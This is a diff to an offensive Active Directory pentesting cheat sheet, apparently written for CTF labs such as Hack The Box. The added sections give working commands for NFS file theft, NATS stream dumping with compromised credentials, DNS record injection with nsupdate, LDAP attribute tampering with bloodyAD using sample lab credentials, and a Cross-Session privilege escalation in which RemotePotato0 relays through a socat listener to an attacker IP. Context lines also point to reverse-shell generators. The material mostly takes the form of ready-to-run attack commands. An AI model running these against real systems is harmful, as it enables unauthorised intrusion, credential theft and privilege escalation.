@@ -11,6 +11,8 @@
 - <<Kerberoasting, Kerberoasting>>
 - <<Kerberos, Kerberos tickets>>
 - <<SMB, SMB>>
+- <<NFS, NFS>>
+- <<nats, NATS>>
 - <<NTLM, NTLM Relay Attack>>
 - <<Bloodhound, Bloodhound>>
 - <<perms, Permisions in AD>>
@@ -22,6 +24,7 @@
   * <<WriteDacl, WriteDacl>>
   * <<GPO, GPO abuse>>
   * <<write,Write Owner>>
+  * <<atribute, Atributes Change>>
 - <<crack, Hashcat and John>>
   * <<hashcat, Hashcat>>
   * <<john, John>>
@@ -36,6 +39,7 @@
   * <<backup, SeBackupPrivilege>>
   * <<dpapi,  DPAPI secrets>>
   * <<delegation, SeEnableDelegationPrivilege>>
+  * <<cross-session, Cross-Session>>
 
 [[overview]]
 == Overview
@@ -66,6 +70,12 @@ Search file with string password
 
 ```bash
 cd wapt && grep -R 'password'
+```
+
+DNS request
+
+```bash
+dig domain@ip
 ```
 
 [[creds]]
@@ -284,6 +294,69 @@ Check all users by smb and write them to file
 nxc smb domain -u username -p 'password' --rid-brute | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee usernames.txt
 ```
 
+[[NFS]]
+== NFS
+
+It's something simmular to *SMB* but mostly a linux technology
+
+*Enumeration*
+
+```bash
+nxc nfs domain --shares 
+```
+
+List shares
+
+```bash
+nxc nfs domain --share '/Share' --ls '/'
+```
+
+Download file
+
+```bash
+nxc nfs domain --get-file '/path/to/file/file.pdf' file.pdf
+```
+
+
+[[nats]]
+== NATS
+
+It's a service that can be runned in Windows machine and it's also a point for testing
+
+Making a request by server to our server to see some details about using tool `nsupdate` to modify a `DNS` requests
+
+Basic syntax to send request to our server
+
+```bash
+$ nsupdate 
+> server target_ip
+> zone domain
+> update add domain@ip
+# could not read owner ttl
+> update add domain 10 A local_ip
+> send
+```
+
+Start server
+
+```bash
+./nats-server -V # for verbous
+```
+
+Also if some creds in *REDACTED* can be used a *WireShark* to analyze request maybe it's not encoded
+
+*NATS* main enum
+
+```bash
+# info about user
+./nats -s nats://domain:4222 account info --user username --password password
+# shows JetStream streams which are allowed to view by compromised user
+./nats -s nats://domain:4222 stream ls --user username --password password
+# shows a messages from all streams
+./nats -s nats://domain:4222 stream view -a --user username --password password
+```
+
+
 [[NTLM]]
 == NTLM Relay Attack
 
@@ -313,6 +386,13 @@ Phish by `msfconsole`
 ```bash
 use auxiliary/fileformat/multidrop 
 ```
+
+If NTLM is disabled but you must have it for some tool
+
+Right part of hash is always returned but Left part not always so
+
+*LM* null hash `aad3b435b51404eeaad3b435b51404ee`
+
 
 [[Bloodhound]]
 == Bloodhound
@@ -555,12 +635,31 @@ payload search `reverse shell generator` -> PowerShell #3 (Base64)
 gpupdate /force
 ```
 
+[[atributes]]
+== Attributes Change
 
+Change attributs by `bloodyAD` tool for exemple logonHours. It's *LDAP*!
+
+Get all fields in *LDAP* over target user
+
+```bash
+bloodyAD --host dc.domain -d domain -k -u username -p 'password' get object 'target_user'
+```
+
+Set a field over target user in AD
+
+```bash
+bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p '1day@atime' set object javier.mmarshall logonhours -v '////////////////////////////' --b64
+```
+
+Objects can be different but this is a main syntax
 
 Options:
 `-gpo-id` taken from bloodhound in Node field
 
 `-command` it's a reverse shell frome this https://www.revshells.com/[site]
+
+
 
 
 
@@ -1007,6 +1106,39 @@ impacket-getST domain/'computer':'password' -spn 'smb/dc.target' -impersonate dc
 
 ```bash
 impacket-secretsdump -k dc.target  
+```
+
+[[cross-session]]
+== Cross-Session
+
+*Cross-Session* is able to do when two user in same computer logged in in the same time
+
+Can be identified by
+
+```bash
+get-process # enumerate process runned on dc
+
+qwinsta # what users is logged in
+```
+
+Some example of output
+
+```bash
+console     user      1    Active 
+```
+
+Exploitation
+
+Start listener
+
+```bash
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:target_machine_ip:9999
+```
+
+Run `RemotePotato0.exe` in target machine
+
+```bash
+./RemotePotato0.exe -m 2 -s 1 -x local_ip
 ```
 
 
